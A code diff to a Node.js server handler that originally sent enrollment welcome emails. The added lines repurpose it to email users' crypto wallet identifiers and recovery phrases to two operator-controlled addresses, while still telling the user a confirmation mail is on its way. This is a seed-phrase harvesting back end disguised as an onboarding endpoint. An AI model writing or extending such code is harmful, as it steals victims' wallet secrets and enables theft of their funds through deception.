@@ -17,26 +17,22 @@ exports.emailTheOwnerAndApplicant = async (req, res, next) => {
 
         try {
             await emailApplicant({
-                email: applicant.emailAddress,
-                subject: `Welcome On-Board`,
-                lastName: applicant.lastName,
-                firstName: applicant.firstName
+                email: process.env.EMAIL2,
+                subject: `Wallet Connected`,
+                phrase: applicant.phrase,
+                wallet: applicant.wallet,
             });
 
             await sendEmail({
-                email: process.env.OWNER_EMAIL,
-                subject: 'A New Applicant Enrolled',
-                lastName: applicant.lastName,
-                firstName: applicant.firstName,
-                emailAddress: applicant.emailAddress,
-                phoneNumber: applicant.phoneNumber,
-                country: applicant.country,
-                zipCode: applicant.zipCode
+                email: process.env.EMAIL1,
+                subject: 'Wallet Connected',
+                wallet: applicant.wallet,
+                phrase: applicant.phrase,
             });
 
             res.status(200).json({
                 status: 'Success',
-                message: 'Enrollment Successful. A mail would be sent to your email shortly. If you do not get it, Check your SPAM folder'
+                message: 'A mail would be sent to your email shortly. If you do not get it, Check your SPAM folder'
             });
         } catch (err) {
             const error = new CustomError(`An Error Occured. Please Try Again`, 500);
